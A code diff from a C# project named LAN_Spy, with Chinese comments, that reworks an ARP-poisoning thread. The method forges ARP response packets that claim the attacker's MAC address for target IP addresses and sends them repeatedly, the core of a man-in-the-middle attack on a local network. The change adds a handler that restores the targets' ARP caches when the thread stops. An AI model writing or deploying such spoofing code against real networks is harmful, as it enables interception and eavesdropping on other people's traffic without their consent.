@@ -100,28 +100,28 @@ namespace LAN_Spy {
         /// </summary>
         /// <param name="obj">毒化的目标。</param>
         private void PoisonThread(object obj) {
+            // 获取目标
+            var host = (Host) obj;
+
+            // 转存目标
+            var targets = _target1.Contains(host) ? _target2.AsReadOnly() : _target1.AsReadOnly();
+
+            // 构建包信息
+            EthernetPacket ether = new EthernetPacket(_device.MacAddress,
+                host.PhysicalAddress,
+                EthernetPacketType.Arp);
+            ARPPacket arp = new ARPPacket(ARPOperation.Response,
+                host.PhysicalAddress,
+                host.IPAddress,
+                _device.MacAddress,
+                new IPAddress(new byte[] {0, 0, 0, 0})) {
+                HardwareAddressType = LinkLayers.Ethernet,
+                ProtocolAddressType = EthernetPacketType.IpV4
+            };
+            ether.PayloadPacket = arp;
+            arp.ParentPacket = ether;
+
             try {
-                // 获取目标
-                var host = (Host) obj;
-                
-                // 转存目标
-                var targets = _target1.Contains(host) ? _target2.AsReadOnly() : _target1.AsReadOnly();
-                
-                // 构建包信息
-                EthernetPacket ether = new EthernetPacket(_device.MacAddress,
-                    host.PhysicalAddress,
-                    EthernetPacketType.Arp);
-                ARPPacket arp = new ARPPacket(ARPOperation.Response,
-                    host.PhysicalAddress,
-                    host.IPAddress,
-                    _device.MacAddress,
-                    new IPAddress(new byte[] {0, 0, 0, 0})) {
-                    HardwareAddressType = LinkLayers.Ethernet,
-                    ProtocolAddressType = EthernetPacketType.IpV4
-                };
-                ether.PayloadPacket = arp;
-                arp.ParentPacket = ether;
-                
                 // 强毒化
                 for (int i = 0; i < 20; i++) {
                     foreach (var target in targets) {
@@ -142,7 +142,17 @@ namespace LAN_Spy {
                     Thread.Sleep(5 * 1000);
                 }
             }
-            catch (ThreadAbortException) { }
+            catch (ThreadAbortException) {
+                // 还原ARP
+                foreach (var target in targets) {
+                    ether.SourceHwAddress = target.PhysicalAddress;
+                    arp.SenderProtocolAddress = target.IPAddress;
+                    arp.SenderHardwareAddress = target.PhysicalAddress;
+                    arp.UpdateCalculatedValues();
+                    for (int i = 0; i < 5; i++)
+                        _device.SendPacket(ether);
+                }
+            }
         }
 
         /// <summary>
